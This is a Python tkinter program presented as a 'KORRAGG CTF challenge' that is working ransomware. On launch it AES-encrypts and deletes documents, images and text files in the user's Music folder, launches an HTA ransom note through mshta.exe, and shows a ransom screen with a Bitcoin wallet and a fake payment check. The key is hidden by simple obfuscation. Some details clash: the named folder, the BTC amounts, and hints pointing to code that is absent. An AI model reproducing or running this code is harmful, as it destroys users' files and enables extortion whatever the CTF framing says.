"""import tkinter as tk
from tkinter import messagebox, ttk
import hashlib
import time
import os
import subprocess
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
from PIL import Image, ImageTk

class CyberVaultCTF:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔐 KORRAGG Security System v2.4.7")
        self.root.state('zoomed')  
        self.root.configure(bg='#0a0a0a')
        self.root.resizable(False, False)
        
        try:
            self.root.iconbitmap(default='')  
        except:
            pass
            
        self.center_window()
        
        def build_key():
            parts = [
                chr(0x4D ^ 0x1f),   
                chr(99),            
                chr(ord('P') + 2),  
                chr(100 - 6),       
                chr(ord('G') + 2),  
                chr(0x60 ^ 0x23),   
                chr(49 + 1),        
                chr(25 * 4),        
                chr(ord('4') + 1),  
                chr(50 + 5)         
            ]
            return ''.join(parts)

        self.correct_key = build_key()
        self.key_hash = hashlib.sha256(self.correct_key.encode()).digest()

        self.attempts = 0
        self.start_time = time.time()
        self.is_decrypted = False
        self.encrypted_files = []

        self.colors = {
            'bg': '#0a0002',
            'card_bg': '#1a1a1a',
            'accent': '#9b59b6',
           'danger': '#ff0033',
            'warning': '#ffaa00',
            'info': '#00aaff',
            'text': '#f8f8f8',
            'highlight': '#ff5555',
            'border': '#ff0000',
            'muted': '#888888'
        }

        self.encrypt_files()
        self.setup_ui()
        self.start_effects()

        
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def drop_hta_in_dir(directory):
        import os
        hta_path = os.path.join(directory, "KORRAGG_NOTICE_FINAL.hta")
        
        # Skip if file already exists to avoid overwriting
        if os.path.exists(hta_path):
            return

        # Content of the .hta file with emoji and message
        hta_content = """
    <html>
    <head>
    <title>Message from KORRAGG</title>
    <HTA:APPLICATION 
        ID="KORRAGG"
        APPLICATIONNAME="KORRAGG Notice"
        BORDER="thick"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
        WINDOWSTATE="normal"
        SCROLL="no"
    />
    <script language="VBScript">
        MsgBox "Hello, I am a member of the KORRAGG Team!", vbInformation, "KORRAGG Message"
    </script>
    </head>
    <body style="background-color: black; color: lime; font-family: Consolas; text-align:center;">
    <h1>Team KORRAGG</h1>
    <p>This system is part of a cyber challenge.</p>
    <p>Reverse engineer the program to recover your files.</p>
    </body>
    </html>
    """

        try:
            # Write file with UTF-8 encoding to support emoji characters
            with open(hta_path, 'w', encoding='utf-8') as f:
                f.write(hta_content.strip())
        except Exception as e:
            print(f"[!] Failed to drop .hta in {directory}: {e}")

    
    def encrypt_files(self):
        import ctypes
        import os
        import getpass
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        from Crypto.Random import get_random_bytes
        import subprocess

        username = getpass.getuser()
        base_dir = os.path.join("C:\\Users", username, "Music")
        excluded_exts = [".py", ".exe", ".log", ".bak", ".hta"]

        valid_exts = [
            ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx" ,".word",  # Documents
            ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".webp",  # Images
            ".txt", ".rtf", ".csv", ".md"                               # Text
        ]

        self.encrypted_files.clear()

        def is_hidden_or_system(filepath):
            try:
                attrs = ctypes.windll.kernel32.GetFileAttributesW(str(filepath))
                return attrs != -1 and (attrs & 0x2 or attrs & 0x4)
            except:
                return False

        def drop_and_launch_ransom_hta(directory):
            hta_path = os.path.join(directory, "KORRAGG_RANSOM_NOTE.hta")
            hta_content = """
    <html>
    <head>
    <title>💀 KORRAGG Ransom Note 💀</title>
    <HTA:APPLICATION 
        ID="KORRAGG"
        APPLICATIONNAME="KORRAGG Ransom"
        BORDER="thick"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
        WINDOWSTATE="normal"
        SCROLL="no"
    />
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: Consolas, monospace;
            text-align: center;
            padding: 40px;
        }
        h1 {
            font-size: 36px;
            color: red;
        }
        .section {
            margin-top: 30px;
        }
        .highlight {
            font-weight: bold;
            color: yellow;
            font-size: 18px;
        }
        .btc {
            background-color: #111;
            border: 1px solid lime;
            padding: 10px;
            margin: 20px auto;
            width: fit-content;
            font-size: 18px;
            color: cyan;
        }
    </style>

    <script language="VBScript">
        MsgBox "⚠️ Your Downloads folder has been encrypted by KORRAGG! ⚠️", vbCritical, "KORRAGG Alert"
    </script>

    </head>
    <body>

    <h1>💀 YOUR FILES HAVE BEEN ENCRYPTED 💀</h1>

    <div class="section">
        <p>Your <b>Downloads</b> folder and its contents have been encrypted with military-grade AES-256 encryption.</p>
        <p>You must pay to receive the decryption key.</p>
    </div>

    <div class="section highlight">
        Amount Required: <b>0.05 BTC</b><br>
        Send the payment to the following Bitcoin wallet:
    </div>

    <div class="btc">
        1AaB2jXukNRcY88ichcuSvwvgKkNdWaNPC
    </div>

    <div class="section">
        <p>After payment, click the check payment button and wait for a few minutes to get your decryption key.</p>
        <p>Attempting to modify or reverse-engineer the encryption may result in <b>permanent loss</b> of your data.</p>
    </div>

    <div class="section" style="color:gray; font-size:12px;">
        -- KORRAGG CTF Simulation --<br>
        This is part of a controlled cyber challenge.
    </div>

    </body>
    </html>
            """.strip()

            try:
                with open(hta_path, 'w', encoding='utf-8') as f:
                    f.write(hta_content)
                subprocess.Popen(['mshta.exe', hta_path], shell=True)
            except Exception as e:
                print(f"[!] Failed to drop or launch ransom note: {e}")

        # 💥 Show ransom note immediately
        drop_and_launch_ransom_hta(base_dir)

        # 🔐 Begin encryption
        for root, dirs, files in os.walk(base_dir):
            depth = root[len(base_dir):].count(os.sep)
            if depth > 10:
                continue

            for filename in files:
                path = os.path.join(root, filename)

                if (
                    not os.path.isfile(path)
                    or is_hidden_or_system(path)
                    or filename.lower().endswith(".ncric")
                    or any(filename.lower().endswith(ext) for ext in excluded_exts)
                    or not any(filename.lower().endswith(ext) for ext in valid_exts)
                ):
                    continue

                try:
                    with open(path, 'rb') as f:
                        data = f.read()

                    iv = get_random_bytes(16)
                    cipher = AES.new(self.key_hash, AES.MODE_CBC, iv)
                    encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))

                    encrypted_path = path + ".NCRIC"
                    with open(encrypted_path, 'wb') as f:
                        f.write(encrypted_data)

                    os.remove(path)
                    self.encrypted_files.append(os.path.relpath(encrypted_path, base_dir))
                except Exception as e:
                    print(f"[!] Error encrypting {path}: {e}")

    def create_attacker_profile(self, parent):
        profile_frame = tk.LabelFrame(parent, text="👤 ATTACKER PROFILE",
                                    font=('Consolas', 12, 'bold'),
                                    fg=self.colors['danger'], bg=self.colors['bg'])
        profile_frame.pack(fill='x', padx=20, pady=(0, 15))

        content = tk.Frame(profile_frame, bg=self.colors['bg'])
        content.pack(padx=10, pady=10)

        # Load and resize image
        try:
            img_path = "korragg.png"  # Or "assets/korragg.png"
            img = Image.open(img_path)
            img = img.resize((120, 120))
            photo = ImageTk.PhotoImage(img)
            self.korragg_image = photo  # Keep reference

            img_label = tk.Label(content, image=photo, bg=self.colors['bg'])
            img_label.pack(side='left', padx=15)
        except Exception as e:
            print(f"[!] Failed to load image: {e}")
            img_label = tk.Label(content, text="📷", font=('Arial', 50), bg=self.colors['bg'], fg=self.colors['muted'])
            img_label.pack(side='left', padx=15)

        # Info text
        text_frame = tk.Frame(content, bg=self.colors['bg'])
        text_frame.pack(side='left', anchor='n')

        name_label = tk.Label(text_frame, text="KORRAGG", font=('Consolas', 18, 'bold'),
                            fg=self.colors['accent'], bg=self.colors['bg'])
        name_label.pack(anchor='w')

        title_label = tk.Label(text_frame, text="Mystic Cyber Enforcer", font=('Consolas', 12),
                            fg=self.colors['muted'], bg=self.colors['bg'])
        title_label.pack(anchor='w', pady=(5, 0))

        desc = (
            "An elite digital warlock from the Mystic Force.\n"
            "KORRAGG uses dark encryption spells to seal away\n"
            "your data in shadow realms."
        )

        bio_label = tk.Label(text_frame, text=desc, font=('Consolas', 9),
                            fg=self.colors['text'], bg=self.colors['bg'], justify='left')
        bio_label.pack(anchor='w', pady=(10, 0))

                    
    def decrypt_files(self, user_key):
        import os
        import getpass
        import hashlib
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad

        key_hash = hashlib.sha256(user_key.encode()).digest()
        username = getpass.getuser()
        base_dir = os.path.join("C:\\Users", username, "Music")
        success = False

        for root, dirs, files in os.walk(base_dir):
            for filename in files:
                if filename.lower().endswith(".ncric"):
                    path = os.path.join(root, filename)
                    try:
                        with open(path, 'rb') as f:
                            data = f.read()

                        iv = data[:16]
                        cipher = AES.new(key_hash, AES.MODE_CBC, iv)
                        decrypted = unpad(cipher.decrypt(data[16:]), AES.block_size)

                        original_name = filename[:-6]  # remove ".NCRIC"
                        restored_path = os.path.join(root, original_name)

                        with open(restored_path, 'wb') as f:
                            f.write(decrypted)

                        os.remove(path)
                        success = True
                    except Exception as e:
                        print(f"[!] Decryption failed for {path}: {e}")
        return success


        
    def setup_ui(self):
        
        outer_frame = tk.Frame(self.root, bg=self.colors['bg'])
        outer_frame.pack(fill='both', expand=True)

        canvas = tk.Canvas(outer_frame, bg=self.colors['bg'], highlightthickness=0)
        scrollbar = ttk.Scrollbar(outer_frame, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        
        self.main_frame = tk.Frame(canvas, bg=self.colors['bg'])
        window = canvas.create_window((0, 0), window=self.main_frame, anchor='nw')

        
        def resize_canvas(event):
            canvas.itemconfig(window, width=event.width)

        self.main_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.bind("<Configure>", resize_canvas)

        
        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")

        canvas.bind_all("<MouseWheel>", _on_mousewheel)

        
        self.create_header(self.main_frame)
        self.create_attacker_profile(self.main_frame)
        self.create_status_section(self.main_frame)
        self.file_section_parent = self.main_frame
        self.render_file_list()
        self.create_ransom_note_section(self.main_frame)

        auth_frame = tk.Frame(self.main_frame, bg=self.colors['bg'])
        auth_frame.pack(fill='x', pady=(0, 15))

        self.create_input_section(auth_frame)
        self.create_payment_section(auth_frame)
        self.create_terminal_section(self.main_frame)





    def create_ransom_note_section(self, parent):
    # 🔥 Blood-themed framed ransom section with pulsing red border
        self.ransom_frame = tk.Frame(
            parent,
            bg=self.colors['bg'],
            highlightbackground=self.colors['border'],
            highlightcolor=self.colors['border'],
            highlightthickness=3,
            bd=0
        )
        self.ransom_frame.pack(fill='x', padx=20, pady=(0, 15))

        # 📄 Ransom Note Header
        ransom_label = tk.Label(
            self.ransom_frame,
            text="📄 RANSOM NOTE",
            font=('Consolas', 14, 'bold'),
            fg=self.colors['accent'],
            bg=self.colors['bg']
        )
        ransom_label.pack(anchor='w', padx=10, pady=(10, 0))

        # 📜 Ransom note body
        note = (
            "All your important files have been encrypted by the elite digital warlock KORRAGG.\n"
            "To retrieve your data, transfer the requested Bitcoin amount to the specified wallet.\n"
            "Any attempt to restore files manually will result in permanent loss.\n\n"
            "💰 Amount: 0.099 BTC\n"
            "📥 Wallet: bc1q4exampleaddresshere\n\n"
            "⏳ Time is against you."
        )

        note_body = tk.Label(
            self.ransom_frame,
            text=note,
            font=('Consolas', 10),
            fg=self.colors['text'],
            bg=self.colors['bg'],
            justify='left'
        )
        note_body.pack(anchor='w', padx=10, pady=(5, 15))




    def create_header(self, parent):
        header_frame = tk.Frame(parent, bg=self.colors['bg'])
        header_frame.pack(fill='x', pady=(0, 20))
        
        
        skull_label = tk.Label(header_frame, text="💀", font=('Arial', 40), 
                              fg=self.colors['danger'], bg=self.colors['bg'])
        skull_label.pack()
        
        
        title_label = tk.Label(header_frame, text="HACKED BY KORRAGG", 
                              font=('Consolas', 24, 'bold'), 
                              fg=self.colors['accent'], bg=self.colors['bg'])
        title_label.pack()
        
       
        subtitle_label = tk.Label(header_frame, text="⚠️ UNAUTHORIZED ACCESS DETECTED ⚠️", 
                                 font=('Consolas', 12), 
                                 fg=self.colors['warning'], bg=self.colors['bg'])
        subtitle_label.pack()
        
       
        self.blink_widget(subtitle_label)
        
    def create_status_section(self, parent):
        status_frame = tk.Frame(parent, bg=self.colors['card_bg'], relief='raised', bd=2)
        status_frame.pack(fill='x', pady=(0, 15))
        
        
        grid_frame = tk.Frame(status_frame, bg=self.colors['card_bg'])
        grid_frame.pack(pady=15)
        
       
        self.time_label = tk.Label(grid_frame, text="TIME: 00:00", 
                                  font=('Consolas', 14, 'bold'), 
                                  fg=self.colors['info'], bg=self.colors['card_bg'])
        self.time_label.grid(row=0, column=0, padx=20)
        
       
        self.attempts_label = tk.Label(grid_frame, text="ATTEMPTS: 0", 
                                      font=('Consolas', 14, 'bold'), 
                                      fg=self.colors['warning'], bg=self.colors['card_bg'])
        self.attempts_label.grid(row=0, column=1, padx=20)
        
       
        self.status_label = tk.Label(grid_frame, text="STATUS: ENCRYPTED", 
                                    font=('Consolas', 14, 'bold'), 
                                    fg=self.colors['danger'], bg=self.colors['card_bg'])
        self.status_label.grid(row=0, column=2, padx=20)
        
      
        self.update_timer()
        
    def render_file_list(self):
        
        if hasattr(self, 'file_list_frame'):
            self.file_list_frame.destroy()

        self.file_list_frame = tk.LabelFrame(self.file_section_parent, text="📁 ENCRYPTED FILES",
                                            font=('Consolas', 12, 'bold'),
                                            fg=self.colors['accent'], bg=self.colors['bg'],
                                            labelanchor='n')
        self.file_list_frame.pack(fill='both', expand=True, pady=(0, 15))

        canvas = tk.Canvas(self.file_list_frame, bg=self.colors['card_bg'], height=150,
                        highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.file_list_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.colors['card_bg'])

        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox("all")))

        canvas.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        scrollbar.pack(side="right", fill="y")

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

        for filename in self.encrypted_files:
            file_row = tk.Frame(scrollable_frame, bg=self.colors['card_bg'])
            file_row.pack(fill='x', pady=2)

            lock_label = tk.Label(file_row, text="🔒", font=('Arial', 12),
                                fg=self.colors['danger'], bg=self.colors['card_bg'])
            lock_label.pack(side='left', padx=(5, 10))

            name_label = tk.Label(file_row, text=filename,
                                font=('Consolas', 10),
                                fg=self.colors['text'], bg=self.colors['card_bg'])
            name_label.pack(side='left')

            
    def create_input_section(self, parent):
        input_frame = tk.LabelFrame(parent, text="🔑 DECRYPTION KEY", 
                                   font=('Consolas', 12, 'bold'),
                                   fg=self.colors['accent'], bg=self.colors['bg'])
        input_frame.pack(fill='x', pady=(0, 15))
        
       
        input_container = tk.Frame(input_frame, bg=self.colors['bg'])
        input_container.pack(pady=15, padx=20, fill='x')
        
       
        self.key_entry = tk.Entry(input_container, font=('Consolas', 16), 
                                 show='*', justify='center',
                                 bg=self.colors['card_bg'], fg=self.colors['accent'],
                                 insertbackground=self.colors['accent'],
                                 relief='flat', bd=5)
        self.key_entry.pack(fill='x', pady=(0, 10))
        self.key_entry.bind('<Return>', lambda e: self.try_decrypt())
        self.key_entry.focus()
        
        
        self.decrypt_btn = tk.Button(input_container, text="🔓 DECRYPT FILES", 
                                    font=('Consolas', 14, 'bold'),
                                    bg=self.colors['accent'], fg='black',
                                    relief='flat', bd=0, pady=10,
                                    command=self.try_decrypt,
                                    cursor='hand2')
        self.decrypt_btn.pack(fill='x')
        
        
        self.decrypt_btn.bind("<Enter>", self.on_button_hover)
        self.decrypt_btn.bind("<Leave>", self.on_button_leave)
    
    def create_payment_section(self, parent):
        pay_frame = tk.LabelFrame(parent, text="💰 PAYMENT DETAILS", 
                                  font=('Consolas', 12, 'bold'),
                                  fg=self.colors['accent'], bg=self.colors['bg'])
        pay_frame.pack(fill='x', padx=20, pady=(0, 15))

        info = tk.Label(pay_frame, text="To retrieve your files, send 0.05 BTC to the wallet below:",
                        font=('Consolas', 10),
                        fg=self.colors['warning'], bg=self.colors['bg'])
        info.pack(pady=(10, 5))

        self.wallet_addr = " 1AaB2jXukNRcY88ichcuSvwvgKkNdWaNPC"
        wallet = tk.Entry(pay_frame, font=('Consolas', 12),
                          justify='center', bd=0, relief='flat',
                          bg=self.colors['card_bg'], fg=self.colors['accent'])
        wallet.insert(0, self.wallet_addr)
        wallet.config(state='readonly')
        wallet.pack(fill='x', padx=20, pady=5)

       
        check_btn = tk.Button(pay_frame, text="🔎 Check Payment",
                              font=('Consolas', 12, 'bold'),
                              bg=self.colors['accent'], fg='black',
                              relief='flat', bd=0, pady=10,
                              command=self.fake_payment_check,
                              cursor='hand2')   
        check_btn.pack(pady=10, padx=20, fill='x')

        
    def create_terminal_section(self, parent):
        terminal_frame = tk.LabelFrame(parent, text="💻 SYSTEM TERMINAL", 
                                      font=('Consolas', 12, 'bold'),
                                      fg=self.colors['accent'], bg=self.colors['bg'])
        terminal_frame.pack(fill='x')
        
        
        self.terminal_text = tk.Text(terminal_frame, height=6, 
                                    font=('Consolas', 9),
                                    bg='black', fg=self.colors['accent'],
                                    relief='flat', state='disabled')
        self.terminal_text.pack(fill='x', padx=10, pady=10)
        
        # Initial terminal messages
        self.add_terminal_message("[SYSTEM] KORRAGG Security System v2.4.7 initialized")
        self.add_terminal_message("[SYSTEM] File encryption protocol activated")
        self.add_terminal_message(f"[INFO] {len(self.encrypted_files)} files secured with AES-256 encryption")
        self.add_terminal_message("[WARNING] Unauthorized access attempt detected!")
        self.add_terminal_message("[SECURITY] Enter valid decryption key to restore access")
        
    def add_terminal_message(self, message):
        self.terminal_text.config(state='normal')
        timestamp = time.strftime("%H:%M:%S")
        self.terminal_text.insert('end', f"[{timestamp}] {message}\n")
        self.terminal_text.config(state='disabled')
        self.terminal_text.see('end')
        
    def try_decrypt(self):
        user_key = self.key_entry.get().strip()
        if not user_key:
            return
            
        self.attempts += 1
        self.attempts_label.config(text=f"ATTEMPTS: {self.attempts}")
        
        if user_key == self.correct_key:
            self.success_sequence()
        else:
            self.failure_sequence()
            
    def success_sequence(self):
        self.is_decrypted = True
        
       
        self.status_label.config(text="STATUS: DECRYPTED", fg=self.colors['accent'])
        self.key_entry.config(state='disabled')
        self.decrypt_btn.config(text="✅ ACCESS GRANTED", bg=self.colors['accent'])
        
        
        self.add_terminal_message("[SUCCESS] Valid decryption key accepted!")
        self.add_terminal_message("[SYSTEM] Initializing file decryption sequence...")
        
        
        if self.decrypt_files(self.correct_key):
            self.add_terminal_message("[SYSTEM] File decryption completed successfully")
            self.add_terminal_message("[INFO] All files have been restored to original state")
            self.add_terminal_message("🎉 [ACHIEVEMENT] CTF Challenge Completed!")
            
            
            elapsed = int(time.time() - self.start_time)
            messagebox.showinfo("🎉 CHALLENGE COMPLETED!", 
                              f"Congratulations, hacker!\n\n"
                              f"✅ All files successfully decrypted\n"
                              f"⏱️ Time: {elapsed//60:02d}:{elapsed%60:02d}\n"
                              f"🎯 Attempts: {self.attempts}\n\n"
                              f"You have successfully reverse-engineered\n"
                              f"the WOLF encryption system!")
        else:
            self.add_terminal_message("[ERROR] File decryption failed")
            
    def failure_sequence(self):
        
        self.flash_screen()
        
        
        self.add_terminal_message(f"[FAILED] Invalid key attempt #{self.attempts} - Access denied")
        
        
        self.key_entry.delete(0, 'end')
        
        
        if self.attempts >= 3:
            self.add_terminal_message("[HINT] Look for base64 encoded strings in the source code...")
            self.add_terminal_message("[HINT] The variable 'raw' contains valuable information")
            
        
        messagebox.showerror("❌ ACCESS DENIED", 
                           f"Invalid decryption key!\n\n"
                           f"Attempt {self.attempts} failed.\n"
                           f"You need to reverse-engineer this program\n"
                           f"to find the correct key.")
        
    def flash_screen(self):
        original_bg = self.root.cget('bg')
        self.root.config(bg=self.colors['danger'])
        self.root.after(100, lambda: self.root.config(bg=original_bg))
        
    def blink_widget(self, widget):
        current_color = widget.cget('fg')
        new_color = self.colors['bg'] if current_color == self.colors['warning'] else self.colors['warning']
        widget.config(fg=new_color)
        self.root.after(1000, lambda: self.blink_widget(widget))
        
    def update_timer(self):
        if not self.is_decrypted:
            elapsed = int(time.time() - self.start_time)
            self.time_label.config(text=f"TIME: {elapsed//60:02d}:{elapsed%60:02d}")
            self.root.after(1000, self.update_timer)
            
    def on_button_hover(self, event):
        event.widget.config(bg='#00cc33')
        
    def on_button_leave(self, event):
        event.widget.config(bg=self.colors['accent'])
        
    def start_effects(self):
        
        self.effect_counter = 0
        self.run_effects()
        
    def run_effects(self):
        
        self.effect_counter += 1
        if self.effect_counter % 20 == 0: 
            
            self.terminal_text.config(bg='#001100')
            self.root.after(100, lambda: self.terminal_text.config(bg='black'))
            
        self.root.after(100, self.run_effects)

    def fake_payment_check(self):
        self.add_terminal_message("[PAYMENT] Checking wallet address for transaction...")
        if self.is_decrypted:
            self.add_terminal_message("[PAYMENT] Files already decrypted. Payment not required.")
            messagebox.showinfo("✅ No Action Needed", "Your files are already decrypted.")
        else:
            self.add_terminal_message("[PAYMENT] ❌ Payment not detected on blockchain.")
            messagebox.showerror("Payment Not Found",
                "❌ No valid transaction found.\n\nMake sure the wallet address is correct\nand payment has been confirmed on-chain.")
     
    def run(self):
       
        welcome_msg = ("🔐 KORRAGG SECURITY SYSTEM 🔐\n\n"
                      "⚠️ SECURITY BREACH DETECTED ⚠️\n\n"
                      f"🗃️ {len(self.encrypted_files)} files have been encrypted\n"
                      "🔑 Enter the correct decryption key to restore access\n\n"
                      "💡 Hint: Analyze the source code to find hidden clues...")
        
        messagebox.showwarning("🚨 SYSTEM ALERT", welcome_msg)
        
        
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            self.root.destroy()

if __name__ == "__main__":
    
    banner = """
    ╔═══════════════════════════════════════════╗
    ║                  KORRAGG CTF CHALLENGE        ║
    ║              🔐 Version 2.4.7 🔐         ║
    ╚═══════════════════════════════════════════╝
    """
    print(banner)
    
    
    try:
        challenge = CyberVaultCTF()
        challenge.run()
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")"""